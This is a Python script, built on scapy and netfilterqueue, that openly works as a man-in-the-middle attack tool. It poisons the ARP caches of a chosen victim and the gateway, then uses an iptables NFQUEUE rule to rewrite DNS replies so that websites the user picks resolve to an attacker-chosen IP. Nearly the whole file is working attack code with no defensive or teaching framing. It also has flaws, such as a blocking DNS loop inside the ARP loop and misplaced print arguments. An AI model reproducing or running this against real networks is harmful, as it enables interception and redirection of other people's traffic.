from scapy.all import Ether, ARP, srp, send, IP, DNSRR, DNSQR, DNS, UDP
import socket, struct
from netfilterqueue import NetfilterQueue
import os
from time import sleep

#ARP SPOOFING
#function to return the victim's MAC address
def getMAC(victimIP):   
    #Broadcast MAC address and ARP address made into a packet
    arpPKT= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=victimIP)    
    #Scapy's srp() function sends requests as packets and listens for responses
    victimMAC= srp(arpPKT, timeout=2 , verbose= False)[0][0][1].hwsrc #save MAC address with the matching IP address provided
    return victimMAC

def spoofArpTable(victimIP, victimMAC, attackerIP):  
    #function changes ARP cache of the victim IP address  
    spoofed= ARP(op=2 , pdst=victimIP, psrc=attackerIP, hwdst= victimMAC)  
    send(spoofed, verbose= False) #send the packet  

#restore the ARP table to its default values before thea attack
def restoreArpTable(victimIP, victimMAC, attackerIP, attackerMAC):   
    packet= ARP(op=2 , hwsrc=attackerMAC , psrc= attackerIP, hwdst= victimMAC , pdst= victimIP)  
    send(packet, verbose=False) #send the packet   
    print ("ARP returned to normal for this IP:"), victimIP  

#get the router's IP address 
def getGatewayIP():   
    with open("/proc/net/route") as route:   
        for line in route:   
            #Getting rid of spaces and separating each field
            fields = line.strip().split()    
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:    
                continue    

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))    

#DNS SPOOFING
def dns():
    print("")
    print("---DNS spoofing---")
    dns_hosts = {}
    open = True
    while open:
        website = raw_input("\nChoose a website you would like to attack:")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        ipSpoof = raw_input("Choose an IP to redirect the website to:")
        dns_hosts[website] = ipSpoof
        repeat = raw_input("\nWould you like to add another website?[y/n]")
        if repeat == 'n':
            open = False
    #callback function that processes the packets and check if they are DNS reply packets
    def processPkt(packet):   
        #Make the netfilter queue packet into a scapy one
        scapyPkt = IP(packet.get_payload())    
        #Check if it is a response
        if scapyPkt.haslayer(DNSRR):     
            print("The state of the website before:"), scapyPkt[DNS].summary()    
            #It is a response from the website then modify the packet
            scapyPkt = modifyPkt(scapyPkt)     
            print("The state of the website after:"), scapyPkt[DNS].summary()   
            #Make the scapy packet into a netfilter queue one
            packet.set_payload(bytes(scapyPkt))    
        packet.accept()    

    #function modifies the reply packet to the attacker's dictionary
    #replaces the real IP address of the website with the fake IP address
    def modifyPkt(packet):      
        #Obtain the domanin name  
        domain_name = packet[DNSQR].qname     
        if domain_name not in dns_hosts:         
        #Only modify if it is present in the dictionary
            print("no changes occured:"), domain_name   
            return packet    
        #Redirecting the DNS to the new IP
        packet[DNS].an = DNSRR(rrname=domain_name, rdata=dns_hosts[domain_name])    
        #Only one DNSRR to the victim
        packet[DNS].ancount = 1    
        #DNS change might not be effective as these might alert that something is going on, so we delete checksum and length 
        del packet[UDP].len    
        del packet[UDP].chksum            
        del packet[IP].len  
        del packet[IP].chksum    
 
        return packet   
    #This is the queue number
    number = 0       
    #Implement forward rule which allows us forward packets to whatever we want
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(number))   
    nfqueue = NetfilterQueue()   

    nfqueue.bind(number, processPkt)   
    nfqueue.run()  
    #Return DNS to normal
    if(KeyboardInterrupt):
        os.system("iptables --flush")

def main():
    #Input from keyboard the victim's IP
    victimIP= raw_input("IP address to spoof:")
    #Calling getGatewayIP() to obtain the gateway IP
    gatewayIP= getGatewayIP()
    silent = raw_input("\nWould you like silent mode active?[y/n]")
    if silent == "y":
        print("Activating IP forwarding..."); sleep(1.0)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") #Enabling IP forwarding for "silent" mode
    else:
        print("Disabling IP forwarding..."); sleep(1.0)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") #Disabling IP forwarding for "all out" mode

    try:   
        #Calling getMAC() to obtain the victim's MAC
        victimMAC= getMAC(victimIP)    
        print ("Victim's MAC address:"), victimMAC   
    except:   
        print ("Victim did not respond to the attack")   
        quit()     

    try:   
        #Calling getMAC() to obtain the router's MAC   
        gatewaymac= getMAC(gatewayIP)   
        print ("Gateway MAC:"), gatewaymac   
    except:   
        print ("Gateway is unreachable")   
        quit()     
    try:    
        print ("ARP spoofing is active. In order to stop the attack press CTRL + C")   

        #Start ARP spoofing and keep running until CTRL+C is pressed  
        while True:   
            spoofArpTable(victimIP, victimMAC, gatewayIP)   
            spoofArpTable(gatewayIP, gatewaymac, victimIP)    
            dns()    
    except KeyboardInterrupt:   
        print ("ARP spoofing stopped")  
        
        #Restore ARP tables to normal for victim and gateway after stopping the spoofing
        restoreArpTable(gatewayIP, gatewaymac, victimIP, victimMAC)   
        restoreArpTable(victimIP, victimMAC, gatewayIP, gatewaymac)  
        quit()   

if __name__=="__main__":
    main()
